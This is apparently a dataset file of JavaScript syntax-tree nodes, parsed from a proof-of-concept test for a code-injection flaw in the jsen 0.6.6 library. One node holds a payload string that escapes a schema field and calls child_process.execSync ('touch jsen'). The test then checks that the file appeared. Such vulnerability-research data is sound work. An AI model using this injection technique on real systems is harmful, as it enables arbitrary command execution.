Id:ID¿Type¿SubType¿FunctionContext¿IdentifierName¿Raw¿InternalStructure¿Location¿Code¿Label:LABEL
208¿CallExpression¿¿339¿¿¿¿{"start":{"line":3,"column":13},"end":{"line":3,"column":26},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿CallExpression
209¿Identifier¿¿339¿require¿¿¿{"start":{"line":3,"column":13},"end":{"line":3,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
210¿Literal¿string¿339¿¿'fs'¿¿{"start":{"line":3,"column":21},"end":{"line":3,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Literal
211¿VariableDeclarator¿¿339¿jsen¿¿¿{"start":{"line":4,"column":8},"end":{"line":4,"column":30},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
212¿CallExpression¿¿339¿¿¿¿{"start":{"line":4,"column":15},"end":{"line":4,"column":30},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿CallExpression
213¿Identifier¿¿339¿require¿¿¿{"start":{"line":4,"column":15},"end":{"line":4,"column":22},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
214¿Literal¿string¿339¿¿'jsen'¿¿{"start":{"line":4,"column":23},"end":{"line":4,"column":29},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Literal
215¿VariableDeclarator¿¿339¿path¿¿¿{"start":{"line":5,"column":8},"end":{"line":5,"column":23},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
216¿Literal¿string¿339¿¿'./jsen'¿¿{"start":{"line":5,"column":15},"end":{"line":5,"column":23},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Literal
217¿ExpressionStatement¿¿339¿¿¿¿{"start":{"line":7,"column":2},"end":{"line":7,"column":35},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿ExpressionStatement
218¿AssignmentExpression¿=¿339¿¿¿¿{"start":{"line":7,"column":2},"end":{"line":7,"column":34},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿AssignmentExpression
219¿Identifier¿¿339¿file_exist¿¿¿{"start":{"line":7,"column":2},"end":{"line":7,"column":12},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
220¿CallExpression¿¿339¿¿¿¿{"start":{"line":7,"column":15},"end":{"line":7,"column":34},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿CallExpression
221¿MemberExpression¿¿339¿¿¿¿{"start":{"line":7,"column":15},"end":{"line":7,"column":28},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿MemberExpression
222¿Identifier¿¿339¿fs¿¿¿{"start":{"line":7,"column":15},"end":{"line":7,"column":17},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
223¿Identifier¿¿339¿existsSync¿¿¿{"start":{"line":7,"column":18},"end":{"line":7,"column":28},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
224¿Identifier¿¿339¿path¿¿¿{"start":{"line":7,"column":29},"end":{"line":7,"column":33},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
225¿VariableDeclarator¿¿339¿v18¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
226¿CallExpression¿¿339¿¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿CallExpression
227¿Identifier¿¿339¿expect¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":8},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
228¿Identifier¿¿339¿file_exist¿¿¿{"start":{"line":8,"column":9},"end":{"line":8,"column":19},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
229¿VariableDeclarator¿¿339¿v19¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":32},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
230¿CallExpression¿¿339¿¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":32},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿CallExpression
231¿MemberExpression¿¿339¿¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿MemberExpression
232¿Identifier¿¿339¿v18¿¿¿¿¿Identifier
233¿Identifier¿¿339¿toBe¿¿¿{"start":{"line":8,"column":21},"end":{"line":8,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
234¿Literal¿boolean¿339¿¿false¿¿{"start":{"line":8,"column":26},"end":{"line":8,"column":31},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Literal
235¿ExpressionStatement¿¿339¿¿¿¿{"start":{"line":8,"column":2},"end":{"line":8,"column":33},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿ExpressionStatement
236¿Identifier¿¿339¿v19¿¿¿¿¿Identifier
237¿VariableDeclarator¿¿339¿v20¿¿¿{"start":{"line":13,"column":30},"end":{"line":13,"column":48},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
238¿ObjectExpression¿¿339¿¿¿¿¿¿ObjectExpression
239¿ExpressionStatement¿¿339¿¿¿¿{"start":{"line":13,"column":30},"end":{"line":13,"column":48},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿ExpressionStatement
240¿AssignmentExpression¿=¿339¿¿¿¿{"start":{"line":13,"column":30},"end":{"line":13,"column":48},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿AssignmentExpression
241¿MemberExpression¿¿339¿¿¿¿{"start":{"line":13,"column":30},"end":{"line":13,"column":48},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿MemberExpression
242¿Identifier¿¿339¿v20¿¿¿¿¿Identifier
243¿Identifier¿¿339¿type¿¿¿{"start":{"line":13,"column":32},"end":{"line":13,"column":36},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
244¿Literal¿string¿339¿¿'string'¿¿{"start":{"line":13,"column":38},"end":{"line":13,"column":46},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Literal
245¿VariableDeclarator¿¿339¿v21¿¿¿{"start":{"line":13,"column":18},"end":{"line":13,"column":50},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
246¿ObjectExpression¿¿339¿¿¿¿¿¿ObjectExpression
247¿ExpressionStatement¿¿339¿¿¿¿{"start":{"line":13,"column":18},"end":{"line":13,"column":50},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿ExpressionStatement
248¿AssignmentExpression¿=¿339¿¿¿¿{"start":{"line":13,"column":18},"end":{"line":13,"column":50},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿AssignmentExpression
249¿MemberExpression¿¿339¿¿¿¿{"start":{"line":13,"column":18},"end":{"line":13,"column":50},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿MemberExpression
250¿Identifier¿¿339¿v21¿¿¿¿¿Identifier
251¿Identifier¿¿339¿username¿¿¿{"start":{"line":13,"column":20},"end":{"line":13,"column":28},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
252¿Identifier¿¿339¿v20¿¿¿¿¿Identifier
253¿VariableDeclarator¿¿339¿v22¿¿¿{"start":{"line":14,"column":16},"end":{"line":16,"column":7},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
254¿ArrayExpression¿¿339¿¿¿¿{"start":{"line":14,"column":16},"end":{"line":16,"column":7},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿ArrayExpression
255¿Literal¿string¿339¿¿'\'+clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync('touch jsen')+\''¿¿{"start":{"line":15,"column":8},"end":{"line":15,"column":122},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Literal
256¿VariableDeclarator¿¿339¿v23¿¿¿{"start":{"line":11,"column":19},"end":{"line":17,"column":5},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
257¿ObjectExpression¿¿339¿¿¿¿{"start":{"line":11,"column":19},"end":{"line":17,"column":5},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿ObjectExpression
258¿Property¿¿339¿¿¿¿{"start":{"line":12,"column":6},"end":{"line":12,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Property
259¿Identifier¿¿339¿type¿¿¿{"start":{"line":12,"column":6},"end":{"line":12,"column":10},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
260¿Literal¿string¿339¿¿'object'¿¿{"start":{"line":12,"column":12},"end":{"line":12,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Literal
261¿Property¿¿339¿¿¿¿{"start":{"line":13,"column":6},"end":{"line":13,"column":50},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Property
262¿Identifier¿¿339¿properties¿¿¿{"start":{"line":13,"column":6},"end":{"line":13,"column":16},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
263¿Identifier¿¿339¿v21¿¿¿¿¿Identifier
264¿Property¿¿339¿¿¿¿{"start":{"line":14,"column":6},"end":{"line":16,"column":7},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Property
265¿Identifier¿¿339¿required¿¿¿{"start":{"line":14,"column":6},"end":{"line":14,"column":14},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
266¿Identifier¿¿339¿v22¿¿¿¿¿Identifier
267¿VariableDeclarator¿¿339¿v24¿¿¿{"start":{"line":11,"column":4},"end":{"line":17,"column":6},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
268¿CallExpression¿¿339¿¿¿¿{"start":{"line":11,"column":4},"end":{"line":17,"column":6},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿CallExpression
269¿MemberExpression¿¿339¿¿¿¿{"start":{"line":11,"column":4},"end":{"line":11,"column":18},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿MemberExpression
270¿Identifier¿¿339¿JSON¿¿¿{"start":{"line":11,"column":4},"end":{"line":11,"column":8},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
271¿Identifier¿¿339¿stringify¿¿¿{"start":{"line":11,"column":9},"end":{"line":11,"column":18},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
272¿Identifier¿¿339¿v23¿¿¿¿¿Identifier
273¿VariableDeclarator¿¿339¿schema¿¿¿{"start":{"line":10,"column":6},"end":{"line":18,"column":3},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
274¿CallExpression¿¿339¿¿¿¿{"start":{"line":10,"column":15},"end":{"line":18,"column":3},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿CallExpression
275¿MemberExpression¿¿339¿¿¿¿{"start":{"line":10,"column":15},"end":{"line":10,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿MemberExpression
276¿Identifier¿¿339¿JSON¿¿¿{"start":{"line":10,"column":15},"end":{"line":10,"column":19},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
277¿Identifier¿¿339¿parse¿¿¿{"start":{"line":10,"column":20},"end":{"line":10,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
278¿Identifier¿¿339¿v24¿¿¿¿¿Identifier
279¿TryStatement¿¿339¿¿¿¿{"start":{"line":19,"column":2},"end":{"line":22,"column":16},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿TryStatement
280¿VariableDeclarator¿¿339¿validate¿¿¿{"start":{"line":20,"column":10},"end":{"line":20,"column":33},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
281¿CallExpression¿¿339¿¿¿¿{"start":{"line":20,"column":21},"end":{"line":20,"column":33},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿CallExpression
282¿Identifier¿¿339¿jsen¿¿¿{"start":{"line":20,"column":21},"end":{"line":20,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
283¿Identifier¿¿339¿schema¿¿¿{"start":{"line":20,"column":26},"end":{"line":20,"column":32},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
284¿VariableDeclarator¿¿339¿v25¿¿¿{"start":{"line":21,"column":13},"end":{"line":21,"column":15},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
285¿ObjectExpression¿¿339¿¿¿¿{"start":{"line":21,"column":13},"end":{"line":21,"column":15},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿ObjectExpression
286¿VariableDeclarator¿¿339¿v26¿¿¿{"start":{"line":21,"column":4},"end":{"line":21,"column":16},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
287¿CallExpression¿¿339¿¿¿¿{"start":{"line":21,"column":4},"end":{"line":21,"column":16},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿CallExpression
288¿Identifier¿¿339¿validate¿¿¿{"start":{"line":21,"column":4},"end":{"line":21,"column":12},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
289¿Identifier¿¿339¿v25¿¿¿¿¿Identifier
290¿ExpressionStatement¿¿339¿¿¿¿{"start":{"line":21,"column":4},"end":{"line":21,"column":17},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿ExpressionStatement
291¿Identifier¿¿339¿v26¿¿¿¿¿Identifier
292¿BlockStatement¿¿339¿¿¿¿{"start":{"line":19,"column":6},"end":{"line":22,"column":3},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿BlockStatement
293¿CatchClause¿¿339¿¿¿¿{"start":{"line":22,"column":4},"end":{"line":22,"column":16},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿CatchClause
294¿BlockStatement¿¿339¿¿¿¿{"start":{"line":22,"column":14},"end":{"line":22,"column":16},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿BlockStatement
295¿Identifier¿¿339¿e¿¿¿{"start":{"line":22,"column":11},"end":{"line":22,"column":12},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
296¿ExpressionStatement¿¿339¿¿¿¿{"start":{"line":24,"column":2},"end":{"line":24,"column":35},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿ExpressionStatement
297¿AssignmentExpression¿=¿339¿¿¿¿{"start":{"line":24,"column":2},"end":{"line":24,"column":34},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿AssignmentExpression
298¿Identifier¿¿339¿file_exist¿¿¿{"start":{"line":24,"column":2},"end":{"line":24,"column":12},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
299¿CallExpression¿¿339¿¿¿¿{"start":{"line":24,"column":15},"end":{"line":24,"column":34},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿CallExpression
300¿MemberExpression¿¿339¿¿¿¿{"start":{"line":24,"column":15},"end":{"line":24,"column":28},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿MemberExpression
301¿Identifier¿¿339¿fs¿¿¿{"start":{"line":24,"column":15},"end":{"line":24,"column":17},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
302¿Identifier¿¿339¿existsSync¿¿¿{"start":{"line":24,"column":18},"end":{"line":24,"column":28},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
303¿Identifier¿¿339¿path¿¿¿{"start":{"line":24,"column":29},"end":{"line":24,"column":33},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
304¿VariableDeclarator¿¿339¿v27¿¿¿{"start":{"line":25,"column":2},"end":{"line":25,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
305¿CallExpression¿¿339¿¿¿¿{"start":{"line":25,"column":2},"end":{"line":25,"column":20},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿CallExpression
306¿Identifier¿¿339¿expect¿¿¿{"start":{"line":25,"column":2},"end":{"line":25,"column":8},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
307¿Identifier¿¿339¿file_exist¿¿¿{"start":{"line":25,"column":9},"end":{"line":25,"column":19},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
308¿VariableDeclarator¿¿339¿v28¿¿¿{"start":{"line":25,"column":2},"end":{"line":25,"column":31},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
309¿CallExpression¿¿339¿¿¿¿{"start":{"line":25,"column":2},"end":{"line":25,"column":31},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿CallExpression
310¿MemberExpression¿¿339¿¿¿¿{"start":{"line":25,"column":2},"end":{"line":25,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿MemberExpression
311¿Identifier¿¿339¿v27¿¿¿¿¿Identifier
312¿Identifier¿¿339¿toBe¿¿¿{"start":{"line":25,"column":21},"end":{"line":25,"column":25},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
313¿Literal¿boolean¿339¿¿true¿¿{"start":{"line":25,"column":26},"end":{"line":25,"column":30},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Literal
314¿ExpressionStatement¿¿339¿¿¿¿{"start":{"line":25,"column":2},"end":{"line":25,"column":32},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿ExpressionStatement
315¿Identifier¿¿339¿v28¿¿¿¿¿Identifier
316¿VariableDeclarator¿¿339¿v29¿¿¿{"start":{"line":27,"column":18},"end":{"line":27,"column":35},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
317¿FunctionExpression¿¿339¿anon¿¿¿{"start":{"line":27,"column":18},"end":{"line":27,"column":35},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿FunctionExpression
318¿Identifier¿¿0¿err¿¿¿{"start":{"line":27,"column":28},"end":{"line":27,"column":31},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
319¿BlockStatement¿¿342¿¿¿¿{"start":{"line":27,"column":33},"end":{"line":27,"column":35},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿BlockStatement
320¿VariableDeclarator¿¿339¿v30¿¿¿{"start":{"line":27,"column":2},"end":{"line":27,"column":36},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
321¿CallExpression¿¿339¿¿¿¿{"start":{"line":27,"column":2},"end":{"line":27,"column":36},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿CallExpression
322¿MemberExpression¿¿339¿¿¿¿{"start":{"line":27,"column":2},"end":{"line":27,"column":11},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿MemberExpression
323¿Identifier¿¿339¿fs¿¿¿{"start":{"line":27,"column":2},"end":{"line":27,"column":4},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
324¿Identifier¿¿339¿unlink¿¿¿{"start":{"line":27,"column":5},"end":{"line":27,"column":11},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
325¿Identifier¿¿339¿path¿¿¿{"start":{"line":27,"column":12},"end":{"line":27,"column":16},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿Identifier
326¿Identifier¿¿339¿v29¿¿¿¿¿Identifier
327¿ExpressionStatement¿¿339¿¿¿¿{"start":{"line":27,"column":2},"end":{"line":27,"column":37},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿ExpressionStatement
328¿Identifier¿¿339¿v30¿¿¿¿¿Identifier
329¿BlockStatement¿¿339¿¿¿¿{"start":{"line":1,"column":47},"end":{"line":28,"column":1},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿BlockStatement
330¿VariableDeclarator¿¿337¿v32¿¿¿{"start":{"line":1,"column":0},"end":{"line":28,"column":2},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿VariableDeclarator
331¿CallExpression¿¿337¿¿¿¿{"start":{"line":1,"column":0},"end":{"line":28,"column":2},"fname":"/Users/elza/Documents/MDP/Js_files/code-injection/jsen_0.6.6/jsen.test.js"}¿¿CallExpression
